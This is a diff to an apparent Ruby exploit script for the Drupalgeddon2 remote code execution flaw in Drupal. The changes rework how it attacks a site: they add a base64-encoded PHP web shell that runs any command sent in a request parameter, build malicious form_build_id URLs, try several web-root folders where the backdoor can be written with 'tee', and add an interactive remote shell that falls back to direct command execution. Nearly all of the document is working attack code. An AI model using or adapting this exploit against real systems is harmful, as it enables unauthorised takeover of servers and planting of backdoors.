@@ -23,12 +23,13 @@ proxy_port = 8080
 # Settings - General
 $useragent = "drupalgeddon2"
 webshell = "s.php"
+writeshell = true
 
 
 # Settings - Payload (we could just be happy without this, but we can do better!)
 #bashcmd = "<?php if( isset( $_REQUEST[c] ) ) { eval( $_GET[c]) ); } ?>'
 bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
-bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d | tee #{webshell}"
+bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"
 
 
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
@@ -45,11 +46,12 @@ end
 
 
 # Function gen_evil_url <cmd>
-def gen_evil_url(evil)
+def gen_evil_url(evil, feedback=true)
   # PHP function to use (don't forget about disabled functions...)
   phpmethod = $drupalverion.start_with?('8')? "exec" : "passthru"
-  puts "[*] PHP cmd: #{phpmethod}"
-  puts "[*] Payload: #{evil}"
+
+  #puts "[*] PHP cmd: #{phpmethod}" if feedback
+  puts "[*] Payload: #{evil}" if feedback
 
   ## Check the version to match the payload
   # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
@@ -77,7 +79,8 @@ def gen_evil_url(evil)
     form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
     puts "[!] WARNING: Didn't detect form_build_id" if form_build_id.empty?
 
-    url = $target + "file/ajax/name/%23value/" + form_build_id
+    #url = $target + "file/ajax/name/%23value/" + form_build_id
+    url = $target + "?q=file/ajax/name/%23value/" + form_build_id
     payload = "form_build_id=" + form_build_id
   end
 
@@ -115,6 +118,7 @@ end
 puts "[*] --==[::#Drupalggedon2::]==--"
 puts "-"*80
 puts "[*] Target : #{$target}"
+puts "[*] Write? : Skipping writing web shell" if not writeshell
 puts "-"*80
 
 
@@ -128,8 +132,8 @@ $http = Net::HTTP.new(uri.host, uri.port, proxy_addr, proxy_port)
 
 # Use SSL/TLS if needed
 if uri.scheme == "https"
-  http.use_ssl = true
-  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
+  $http.use_ssl = true
+  $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 end
 
 
@@ -191,10 +195,11 @@ puts "-"*80
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
-# Generate a random string to see if we can echo it
-random = (0...8).map { (65 + rand(26)).chr }.join
 
 # Make a request, testing code execution
+puts "[*] Testing: Code Execution"
+# Generate a random string to see if we can echo it
+random = (0...8).map { (65 + rand(26)).chr }.join
 url, payload = gen_evil_url("echo #{random}")
 response = http_post(url, payload)
 if response.code == "200" and not response.body.empty?
@@ -210,52 +215,94 @@ end
 puts "-"*80
 
 
-# Make a request, try and write to web root
-url, payload = gen_evil_url(bashcmd)
-response = http_post(url, payload)
-if response.code == "200" and not response.body.empty?
-  #result = JSON.pretty_generate(JSON[response.body])
-  result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
-  puts "[+] Result : #{result}"
-else
-  puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
-  exit
-end
+# Location of web shell & used to signal if using PHP shell
+webshellpath = nil
+prompt = "drupalgeddon2"
+# Possibles paths to try
+paths = [
+  "./",
+  "./sites/default/",
+  "./sites/default/files/",
+]
+# Check all
+paths.each do|path|
+  puts "[*] Testing: File Write To Web Root (#{path})"
 
+  # Merge locations
+  webshellpath = "#{path}#{webshell}"
 
-# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+  # Final command to execute
+  cmd = "#{bashcmd} | tee #{webshellpath}"
 
-# Test to see if backdoor is there
-response = http_post("#{$target}#{webshell}", "c=hostname")
-if response.code == "200"
-  puts "[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"
-  puts "-"*80
+  # Generate evil URLs
+  url, payload = gen_evil_url(cmd)
+  # Make the request
+  response = http_post(url, payload)
+  # Check result
+  if response.code == "200" and not response.body.empty?
+    # Feedback
+    #result = JSON.pretty_generate(JSON[response.body])
+    result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+    puts "[+] Result : #{result}"
 
+    # Test to see if backdoor is there (if we managed to write it)
+    response = http_post("#{$target}#{webshellpath}", "c=hostname")
+    if response.code == "200" and not response.body.empty?
+      puts "[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"
+      break
+    else
+      puts "[!] Target is NOT exploitable. No write access here!"
+    end
+  else
+    puts "[!] Target is NOT exploitable for some reason ~ HTTP Response: #{response.code}"
+  end
+  webshellpath = nil
+end if writeshell
+puts "-"*80 if writeshell
+
+if webshellpath
   # Get hostname for the prompt
-  hostname = response.body.to_s.strip
+  prompt = response.body.to_s.strip
 
   # Feedback
   puts "[*] Fake shell:   curl '#{$target}#{webshell}' -d 'c=whoami'"
+elsif writeshell
+  puts "[!] FAILED to find writeable folder"
+  puts "[*] Dropping back to ugly shell..."
+end
 
-  # Stop any CTRL + C action ;)
-  trap("INT", "SIG_IGN")
 
-  # Forever loop
-  loop do
-    # Get input
-    command = Readline.readline("#{hostname}> ", true)
+# Stop any CTRL + C action ;)
+trap("INT", "SIG_IGN")
 
-    # Exit
-    break if command =~ /exit/
 
-    # Blank link?
-    next if command.empty?
+# Forever loop
+loop do
+  # Default value
+  result = "ERROR"
 
+  # Get input
+  command = Readline.readline("#{prompt}>> ", true).to_s
+
+  # Exit
+  break if command =~ /exit/
+
+  # Blank link?
+  next if command.empty?
+
+  # If PHP shell
+  if webshellpath
     # Send request
-    response = http_post("#{$target}#{webshell}", "c=#{command}")
-    puts response.body
+    result = http_post("#{$target}#{webshell}", "c=#{command}").body
+  # Direct commands
+  else
+    url, payload = gen_evil_url(command, false)
+    response = http_post(url, payload)
+    if response.code == "200" and not response.body.empty?
+      result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+    end
   end
-else
-  puts "[!] Exploit FAILED ~ Response: #{response.code}"
-  exit
+
+  # Feedback
+  puts result
 end
